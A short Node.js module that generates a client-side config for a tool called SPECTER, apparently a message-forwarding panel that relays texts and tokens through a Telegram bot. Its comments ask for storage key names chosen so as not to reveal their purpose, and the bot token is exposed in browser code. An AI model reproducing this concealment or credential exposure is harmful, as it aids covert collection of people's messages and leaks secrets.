'use strict';

function jsString(value) {
  return JSON.stringify(value == null ? '' : String(value));
}

function buildConfigJs(env) {
  const e = env || process.env;
  const botToken = e.BOT_TOKEN || '';
  const tgApi = botToken ? 'https://api.telegram.org/bot' + botToken : '';

  return `window.SPECTER = {
  BOT_TOKEN: ${jsString(botToken)},
  TG_API:    ${jsString(tgApi)},

  BLOB_BASE: ${jsString(e.BLOB_BASE || 'https://jsonblob.com/api/jsonBlob')},

  REDIS_URL:   ${jsString(e.REDIS_URL || '')},
  REDIS_TOKEN: ${jsString(e.REDIS_TOKEN || '')},

  /* ═══ Obfuscation key — change to your own secret ═══ */
  CLOAK: ${jsString(e.CLOAK || '')},

  /* ═══ Innocuous Redis key names — don't reveal purpose ═══ */
  RK_USER:    '_cache_usr',      // per-user data
  RK_USERSET: '_cache_idx',      // set of user IDs
  RK_SENT:    '_cache_log',      // sent marker
  RK_PREFIX:  '_c1_',            // per-user key prefix

  TG_CHANNEL_LINK: ${jsString(e.TG_CHANNEL_LINK || '')},
  OWNER_ID: ${jsString(e.OWNER_ID || '')},

  LS_BLOB:    'fbi_blob_id',
  LS_CACHE:   'fbi_config_cache',
  LS_SESSION: 'fbi_session',
  LS_ACTIVE:  'fbi_active_device',

  POLL_DEV: 5000, POLL_MSG: 2000, POLL_BG: 3000, POLL_BAL: 25000,

  DEFAULT_CONFIG: {
    channelId: '', myNumber: '', firebases: [],
    forwardEnabled: true, forwardMode: 'all', botEnabled: true,
    autoBackup: true, autoBackupHour: 3, channelNotify: true, broadcastDelay: 60,
    numStart: '', numEnd: '', msgStart: '', msgEnd: '',
    numLabels: ['To','Receipt','Number','Mobile','Target','Phone'],
    msgLabels: ['Message','Msg','Body','Token','Text']
  }
};
`;
}

module.exports = { buildConfigJs, jsString };
